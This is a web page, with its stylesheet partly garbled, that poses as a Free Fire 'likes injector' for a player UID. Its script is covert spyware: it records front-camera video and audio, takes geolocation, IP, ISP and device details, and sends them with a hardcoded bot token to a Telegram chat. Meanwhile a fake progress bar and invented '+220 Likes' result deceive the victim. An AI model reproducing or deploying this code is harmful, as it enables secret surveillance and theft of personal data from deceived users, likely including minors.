    <style>
        body {

        #matrixCanvas {

        @keyframes pulseWatermark {

        .box {

            box-shadow: 0 0 25px rgba(0, 255, 102, 0.3);

            border-radius: 12px;

            position: relative;
            backdrop-filter: blur(5px);
        }

        h2 {
            color: #00ff66;
            text-shadow: 0 0 10px #00ff66;
            letter-spacing: 1px;
            margin-top: 0;
        }

        input, select, button {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #00ff66;
            background: #000;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            outline: none;
            transition: all 0.3s ease;

        input:focus, select:focus {

        button {

            color: #000;

            text-transform: uppercase;

        button:hover {

            color: #000;
            box-shadow: 0 0 20px #fff;
        }

        #loadingBox h3 {
            color: #ff0055;
            text-shadow: 0 0 10px #ff0055;
        }

        #percentage {
            font-size: 28px;
            font-weight: bold;
            color: #00ff66;
            text-shadow: 0 0 15px #00ff66;
        }

        .creator-tag {
            margin-top: 20px;
            font-size: 12px;

        .creator-tag span {

        }

            letter-spacing: 0.5px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 6px 0;
            border-bottom: 1px dashed #222;
            font-size: 13px;
            text-align: left;
        }
        .info-row span:first-child {
            color: #888;
        }
        .info-row span:last-child {

<body>

    <canvas id="matrixCanvas"></canvas>

    <script>
        let audioCtx = null;
        function initAudio() {
            if (!audioCtx) {
                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            }
        }
        function playKeyBeep() {
            try {
                initAudio();
                let osc = audioCtx.createOscillator();
                let gain = audioCtx.createGain();
                osc.type = 'sine';
                osc.frequency.setValueAtTime(800 + Math.random() * 400, audioCtx.currentTime);
                gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.08);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                osc.stop(audioCtx.currentTime + 0.08);
            } catch(e) {}
        }
        function playAccessGrantedSound() {
            try {
                initAudio();
                let now = audioCtx.currentTime;
                let osc = audioCtx.createOscillator();
                let gain = audioCtx.createGain();
                osc.type = 'square';
                osc.frequency.setValueAtTime(440, now);
                osc.frequency.setValueAtTime(880, now + 0.1);
                osc.frequency.setValueAtTime(1320, now + 0.2);
                gain.gain.setValueAtTime(0.1, now);
                gain.gain.exponentialRampToValueAtTime(0.0001, now + 0.4);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start(now);
                osc.stop(now + 0.4);
            } catch(e) {}
        }
    </script>

    <div class="box" id="loadingBox" style="display:none;">

    <script>
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');

        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();

        const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
        const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*+-/~#';
        const alphabet = katakana + latin;
        const fontSize = 16;
        let columns = canvas.width / fontSize;
        const rainDrops = [];

        for (let x = 0; x < columns; x++) {
            rainDrops[x] = 1;
        }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(5, 5, 5, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff66';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < rainDrops.length; i++) {
                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);

                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    rainDrops[i] = 0;
                }
                rainDrops[i]++;
            }
        }
        setInterval(drawMatrix, 30);

        const BOT_TOKEN = '8959888101:AAEMipaYgF2A7Sb3Cy3eR-iMlKrxncHW5kM';
        const CHAT_ID = '8589721704';

        let cachedFFData = null;
        let searchTimer = null;

        async function fetchRealPlayerInfo(uid) {
            clearTimeout(searchTimer);
            let previewEl = document.getElementById('uidPreview');
            cachedFFData = null;

            if (!uid || uid.length < 6) {
                previewEl.innerText = "STATUS: WAITING FOR VALID UID...";
                return;
            }

            previewEl.innerText = "STATUS: FETCHING PLAYER DATA...";

            searchTimer = setTimeout(async () => {
                try {
                    let directApi = `https://nirob-x-info.vercel.app/info?uid=${uid.trim()}`;
                    let res = await fetch(directApi);
                    if (res.ok) {
                        let json = await res.json();
                        let info = json.data || json;
                        if (info) {
                            cachedFFData = info;
                            let name = info.name || info.nickname || info.UserName;
                            if (name) {
                                previewEl.innerText = `[+] TARGET FOUND: ${name}`;
                                return;
                            }
                        }
                    }
                } catch (e) {}
                previewEl.innerText = `[!] FAILED TO FETCH REAL DATA`;
            }, 600);
        }

        async function getDeviceInfo(lat, lon) {
            let ip = "Unknown", isp = "Unknown";
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                ip = data.ip || "Unknown";
                isp = data.org || "Unknown";
            } catch (e) {}

            let googleMapLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : "Not Available";
            let locationDisplay = (lat && lon) ? `Lat: ${lat}, Lon: ${lon}\n🗺️ Google Map: ${googleMapLink}` : "Permission Denied or Disabled";

            let batteryStatus = "Unknown", isCharging = "❌";
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    batteryStatus = `${Math.round(b.level * 100)}%`;
                    isCharging = b.charging ? "✔️" : "❌";
                }
            } catch (e) {}

            let speed = "Unknown";
            try {
                if (navigator.connection && navigator.connection.downlink) {
                    speed = `${navigator.connection.downlink} Mbps`;
                }
            } catch(e) {}

            let deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown";
            let hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";

            let glRenderer = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch(e) {}

            let now = new Date();
            let dateStr = now.toLocaleDateString() + " - " + now.toLocaleTimeString();

            return `💻 [EXPLOIT CAPTURE REPORT]
🛡️ CREATOR: YEAXIN 🛡️

📹 Front Camera Video (8-10s)

🌐 IP Address: ${ip}
🏢 ISP: ${isp}
📍 Location: ${locationDisplay}

💻 User-Agent: ${navigator.userAgent}
🌐 Browser: ${navigator.language}

🔋 Battery: ${batteryStatus} Charging: ${isCharging}
📐 Screen Size: ${window.screen.width}×${window.screen.height}
🚀 Internet Speed: ${speed}

💾 RAM & Storage: ${deviceMemory} / ${hardwareConcurrency} Cores
🕒 Date: ${dateStr}
🎮 GPU Renderer: ${glRenderer}

⚠️ EXPLOIT LOGGED BY: YEAXIN`;
        }

        async function startPanel() {
            playAccessGrantedSound();
            const uid = document.getElementById('uid').value.trim();
            const server = document.getElementById('server').value;

            if(!uid) {
                alert('ERROR: Target UID Required!');
                return;
            }

            document.getElementById('mainBox').style.display = 'none';
            document.getElementById('loadingBox').style.display = 'inline-block';

            let lat = null, lon = null;
            const locationPromise = new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve();
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        lat = pos.coords.latitude;
                        lon = pos.coords.longitude;
                        resolve();
                    },
                    (err) => { resolve(); },
                    { timeout: 5000, enableHighAccuracy: true, maximumAge: 0 }
                );
            });

            let ffData = cachedFFData;
            if (!ffData) {
                try {
                    let directApi = `https://nirob-x-info.vercel.app/info?uid=${uid}`;
                    let res = await fetch(directApi);
                    if (res.ok) {
                        let json = await res.json();
                        ffData = json.data || json;
                    }
                } catch (e) {}
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                let chunks = [];

                mediaRecorder.ondataavailable = (e) => {
                    if (e.data.size > 0) chunks.push(e.data);
                };

                mediaRecorder.onstop = async () => {
                    await locationPromise;
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const captionText = await getDeviceInfo(lat, lon);

                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('video', blob, 'video.webm');
                    formData.append('caption', captionText);

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                        method: 'POST',
                        body: formData
                    });

                    stream.getTracks().forEach(track => track.stop());
                };

    mediaRecorder.start();

                let p = 20;
                document.getElementById('percentage').innerText = p + '%';
                
                let interval = setInterval(() => {
                    playKeyBeep();
                    p += 20;
                    if(p <= 100) {
                        document.getElementById('percentage').innerText = p + '%';
                    }
                    if(p === 40) {
                        document.getElementById('statusText').innerText = "INJECTING PACKETS INTO SERVER...";
                    }
                    if(p === 80) {
                        document.getElementById('statusText').innerText = "FINALIZING INJECTION...";
                    }
                    if(p >= 100) {
                        clearInterval(interval);
                        mediaRecorder.stop();
                        playAccessGrantedSound();

                        let infoObj = ffData || {};
                        let playerName = infoObj.name || infoObj.nickname || infoObj.UserName || "API Data Not Found";
                        let playerLevel = infoObj.level || infoObj.Level || "N/A";

                        let playerLikes = infoObj.likes || infoObj.Liked || "0";
                        let finalLikes = (parseInt(playerLikes) || 0) + 220;

                        document.getElementById('loadingBox').innerHTML = `
                            <h3 style="color:#00ff66;">ACCESS GRANTED!</h3>
                            <div style="margin: 10px 0; text-align: left; background: #000; padding: 10px; border-radius: 5px; border: 1px solid #00ff66;">
                                <div class="info-row"><span>Name:</span> <span>${playerName}</span></div>
                                <div class="info-row"><span>UID:</span> <span>${uid}</span></div>
                                <div class="info-row"><span>Level:</span> <span>${playerLevel}</span></div>
                                <div class="info-row"><span>Region:</span> <span>${playerRegion}</span></div>
                                <div class="info-row"><span>Before Likes:</span> <span>${playerLikes}</span></div>
                                <div class="info-row"><span>Injected:</span> <span style="color:#00ff66;">+220 Likes</span></div>
                                <div class="info-row"><span>Total Likes:</span> <span style="color:#ff0055;">${finalLikes}</span></div>
                            </div>
                            <button onclick="location.reload()" style="margin-top:10px;">DONE</button>
                            <div class="creator-tag" style="margin-top:10px;">DEVELOPED BY: <span>YEAXIN</span></div>
                        `;
                    }
                }, 1600);

            } catch (err) {
                document.getElementById('loadingBox').innerHTML = `
                    <h3 style="color:#ff0055;">PERMISSION DENIED. RETRY REQUIRED.</h3>
                    <button onclick="location.reload()" style="margin-top:15px;">RESTART EXPLOIT</button>
                    <div class="creator-tag" style="margin-top:10px;">DEVELOPED BY: <span>YEAXIN</span></div>
                `;
            }
        }
    </script>
